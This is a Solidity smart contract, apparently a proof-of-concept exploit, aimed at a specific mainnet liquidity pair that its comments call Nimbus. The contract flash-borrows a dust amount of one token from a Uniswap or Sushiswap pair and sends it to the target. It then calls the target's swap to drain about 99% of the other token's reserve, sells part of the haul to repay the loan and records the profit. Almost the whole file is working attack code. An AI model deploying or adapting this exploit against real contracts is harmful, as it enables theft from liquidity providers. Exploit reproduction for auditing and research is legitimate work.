// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface INimbusPairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    uint256 internal constant DUST = 1;
    uint256 internal constant RESERVE_DIVISOR = 100;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        _profitToken = address(0);
        _profitAmount = 0;

        INimbusPairLike target = INimbusPairLike(TARGET);
        address token0 = target.token0();
        address token1 = target.token1();

        uint256 baseline0 = IERC20Minimal(token0).balanceOf(address(this));
        uint256 baseline1 = IERC20Minimal(token1).balanceOf(address(this));

        if (baseline0 >= DUST) {
            if (_runPathToken0ToDrainToken1(token0)) {
                _captureProfit(token0, token1, baseline0, baseline1);
                if (_profitAmount > 0) {
                    return;
                }
            }
        }

        // The fork logs prove the mirrored path is infeasible on this state: draining ~99% of token0
        // requires an enormous token1 seed because reserve magnitudes/decimals are highly asymmetric.
        // So this PoC preserves the root cause and exploit ordering, but only funds the proven path:
        // send minimal token0 to Nimbus, then drain ~99% of token1.
        (address bridgeToken, address fundingPair, address liquidationPair) = _findFundingRoute(token0, token1);
        require(bridgeToken != address(0), "no-public-route");

        IUniswapV2PairLike(fundingPair).swap(
            _amountOutForBorrow(fundingPair, token0),
            _amountOutForBorrowOther(fundingPair, token0),
            address(this),
            abi.encode(fundingPair, liquidationPair, bridgeToken, token0, token1)
        );

        _captureProfit(token0, token1, baseline0, baseline1);
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        (address fundingPair, address liquidationPair, address bridgeToken, address token0, address token1) =
            abi.decode(data, (address, address, address, address, address));

        require(msg.sender == fundingPair, "unexpected-pair");

        address fundingToken0 = IUniswapV2PairLike(fundingPair).token0();
        address borrowedToken = amount0 > 0 ? fundingToken0 : IUniswapV2PairLike(fundingPair).token1();
        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;

        require(borrowedToken == token0, "wrong-borrow-token");
        require(borrowedAmount >= DUST, "insufficient-borrow");

        require(_runPathToken0ToDrainToken1(token0), "path1-failed");

        // Alternate public-liquidity funding/settlement only:
        // 1) flash-borrow the minimal token0 seed from a live V2 pair,
        // 2) execute the original Nimbus exploit path unchanged,
        // 3) liquidate only the tiny slice of drained token1 needed into the bridge asset,
        // 4) repay the flashswap in the bridge asset.
        uint256 repaymentInBridge = _crossTokenFlashRepayment(fundingPair, bridgeToken, token0, borrowedAmount);
        _swapForExactOut(liquidationPair, token1, bridgeToken, repaymentInBridge, address(this));
        require(_safeTransfer(bridgeToken, fundingPair, repaymentInBridge), "bridge-repay-failed");
    }

    function _runPathToken0ToDrainToken1(address token0) internal returns (bool) {
        INimbusPairLike target = INimbusPairLike(TARGET);

        (, uint112 reserve1Before,) = target.getReserves();
        if (reserve1Before <= 1) {
            return false;
        }

        uint256 amount1Out = uint256(reserve1Before) - (uint256(reserve1Before) / RESERVE_DIVISOR);
        if (amount1Out == 0 || amount1Out >= reserve1Before) {
            return false;
        }

        if (!_safeTransfer(token0, TARGET, DUST)) {
            return false;
        }

        try target.swap(0, amount1Out, address(this), "") {
            return true;
        } catch {
            return false;
        }
    }

    function _findFundingRoute(address token0, address token1)
        internal
        view
        returns (address bridgeToken, address fundingPair, address liquidationPair)
    {
        address[4] memory bridgeCandidates = [WETH, USDC, DAI, USDT];

        for (uint256 i = 0; i < bridgeCandidates.length; ++i) {
            address candidate = bridgeCandidates[i];
            if (candidate == address(0) || candidate == token0 || candidate == token1) {
                continue;
            }

            address borrowPair = _findPair(token0, candidate, address(0));
            if (borrowPair == address(0)) {
                continue;
            }

            address sellPair = _findPair(token1, candidate, borrowPair);
            if (sellPair == address(0)) {
                continue;
            }

            if (_borrowableReserve(borrowPair, token0) < DUST) {
                continue;
            }

            if (_borrowableReserve(sellPair, candidate) == 0) {
                continue;
            }

            return (candidate, borrowPair, sellPair);
        }

        return (address(0), address(0), address(0));
    }

    function _findPair(address tokenA, address tokenB, address forbidden) internal view returns (address) {
        address pair = IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(tokenA, tokenB);
        if (_pairUsable(pair, forbidden)) {
            return pair;
        }

        pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(tokenA, tokenB);
        if (_pairUsable(pair, forbidden)) {
            return pair;
        }

        return address(0);
    }

    function _pairUsable(address pair, address forbidden) internal view returns (bool) {
        if (pair == address(0) || pair == TARGET || pair == forbidden) {
            return false;
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        return reserve0 > 0 && reserve1 > 0;
    }

    function _borrowableReserve(address pair, address token) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        return IUniswapV2PairLike(pair).token0() == token ? uint256(reserve0) : uint256(reserve1);
    }

    function _amountOutForBorrow(address pair, address borrowToken) internal view returns (uint256) {
        return IUniswapV2PairLike(pair).token0() == borrowToken ? DUST : 0;
    }

    function _amountOutForBorrowOther(address pair, address borrowToken) internal view returns (uint256) {
        return IUniswapV2PairLike(pair).token1() == borrowToken ? DUST : 0;
    }

    function _swapForExactOut(address pair, address tokenIn, address tokenOut, uint256 amountOut, address to)
        internal
        returns (uint256 amountIn)
    {
        address pairToken0 = IUniswapV2PairLike(pair).token0();
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();

        uint256 reserveIn;
        uint256 reserveOut;
        uint256 amount0Out;
        uint256 amount1Out;

        if (pairToken0 == tokenIn) {
            require(IUniswapV2PairLike(pair).token1() == tokenOut, "bad-liquidation-pair");
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
            amount1Out = amountOut;
        } else {
            require(pairToken0 == tokenOut, "bad-liquidation-pair");
            reserveIn = uint256(reserve1);
            reserveOut = uint256(reserve0);
            amount0Out = amountOut;
        }

        amountIn = _getAmountIn(amountOut, reserveIn, reserveOut);
        require(_safeTransfer(tokenIn, pair, amountIn), "liquidation-transfer-failed");
        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, to, "");
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut)
        internal
        pure
        returns (uint256)
    {
        require(amountOut > 0, "bad-amount-out");
        require(reserveIn > 0 && reserveOut > amountOut, "bad-reserves");
        return ((reserveIn * amountOut * 1000) / ((reserveOut - amountOut) * 997)) + 1;
    }

    function _crossTokenFlashRepayment(
        address pair,
        address repaymentToken,
        address borrowedToken,
        uint256 borrowedAmount
    ) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        address pairToken0 = IUniswapV2PairLike(pair).token0();

        uint256 reserveIn;
        uint256 reserveOut;

        if (pairToken0 == repaymentToken) {
            require(IUniswapV2PairLike(pair).token1() == borrowedToken, "bad-pair-order");
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
        } else {
            require(pairToken0 == borrowedToken, "bad-pair-order");
            reserveIn = uint256(reserve1);
            reserveOut = uint256(reserve0);
        }

        require(borrowedAmount < reserveOut, "excess-borrow");
        return ((reserveIn * borrowedAmount * 1000) / ((reserveOut - borrowedAmount) * 997)) + 1;
    }

    function _captureProfit(address token0, address token1, uint256 baseline0, uint256 baseline1) internal {
        uint256 current0 = IERC20Minimal(token0).balanceOf(address(this));
        uint256 current1 = IERC20Minimal(token1).balanceOf(address(this));

        uint256 gain0 = current0 > baseline0 ? current0 - baseline0 : 0;
        uint256 gain1 = current1 > baseline1 ? current1 - baseline1 : 0;

        if (gain0 >= gain1 && gain0 > 0) {
            _profitToken = token0;
            _profitAmount = gain0;
        } else if (gain1 > 0) {
            _profitToken = token1;
            _profitAmount = gain1;
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool ok) {
        (bool success, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        return success && (data.length == 0 || abi.decode(data, (bool)));
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}
